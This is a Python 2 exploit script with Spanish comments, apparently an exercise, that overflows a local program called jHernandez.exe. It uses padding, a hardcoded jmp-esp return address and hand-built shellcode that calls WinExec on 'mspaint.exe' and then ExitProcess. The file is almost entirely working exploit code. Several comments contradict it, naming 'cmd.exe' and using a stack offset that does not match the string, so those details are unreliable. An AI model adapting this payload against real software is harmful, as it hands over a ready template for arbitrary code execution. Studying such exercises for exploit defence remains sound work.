#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import struct

junk = "A" * 1672 + "B" * 4;          # Se llena el búfer (variables locales y EBP)

ret = struct.pack('<I',0x76ECE871); # findjmp2 kernel32.dll esp # 0x757EF8F7 jmp esp

shellcode  = "\x55"                       # PUSH EBP
shellcode += "\x8B\xEC"                     # MOV EBP, ESP
shellcode += "\x33\xFF"                     # XOR EDI, EDI # EDI = 0x00
shellcode += "\x57"                         # PUSH EDI     # Fin de cadena
shellcode += "\x83\xEC\x0C"                 # SUB ESP, 0Ch
shellcode += "\xC6\x45\xF4\x6D"             # mov byte ptr [ebp-0Ch], 6Dh ; "m"
shellcode += "\xC6\x45\xF5\x73"             # mov byte ptr [ebp-0Bh], 73h ; "s"
shellcode += "\xC6\x45\xF6\x70"             # mov byte ptr [ebp-0Ah], 70h ; "p"
shellcode += "\xC6\x45\xF7\x61"             # mov byte ptr [ebp-09h], 61h ; "a"
shellcode += "\xC6\x45\xF8\x69"             # mov byte ptr [ebp-08h], 69h ; "i"
shellcode += "\xC6\x45\xF9\x6E"             # mov byte ptr [ebp-07h], 6Eh ; "n"
shellcode += "\xC6\x45\xFA\x74"             # mov byte ptr [ebp-06h], 74h ; "t"
shellcode += "\xC6\x45\xFB\x2E"             # mov byte ptr [ebp-05h], 2Eh ; "."
shellcode += "\xC6\x45\xFC\x65"             # mov byte ptr [ebp-04h], 65h ; "e"
shellcode += "\xC6\x45\xFD\x78"             # mov byte ptr [ebp-03h], 78h ; "x"
shellcode += "\xC6\x45\xFE\x65"             # mov byte ptr [ebp-02h], 65h ; "e"
shellcode += "\x8D\x45\xF4"                 # LEA EAX, DWORD PTR SS:[EBP-08h] # Dirección de "c"
shellcode += "\x50"                         # PUSH EAX                        # "cmd.exe\0"
shellcode += "\xBB\xFD\xE5\xD7\x75"        # MOV EBX, 0x757BE5FD # WinExec() en kernel32.dll
shellcode += "\xFF\xD3"                     # CALL EBX # Ejecuta WinExec() con argumento cmd.exe
shellcode += "\x57"                         # PUSH EDI # 0
shellcode += "\xBB\x4F\x21\xD4\x75"         # MOV EBX, 0x7578214F # ExitProcess() en kernel32.dll
shellcode += "\xFF\xD3";                     # CALL EBX # Ejecuta ExitProcess()

exploit = junk + ret + shellcode;

print "\n" + "*" * 80;
print "Codigos de operacion: \n" + "\\x" + "\\x".join(opcode.encode('hex').upper() for opcode in exploit);
print "\nLongitud: \n", len(exploit);
print "\nCodigo ensamblador (shellcode): ";
asm = ''.join(opcode.encode('hex') for opcode in shellcode);
os.system("disasmdump " + asm);
print "\n" + "*" * 80;

os.system("jHernandez.exe " + exploit);
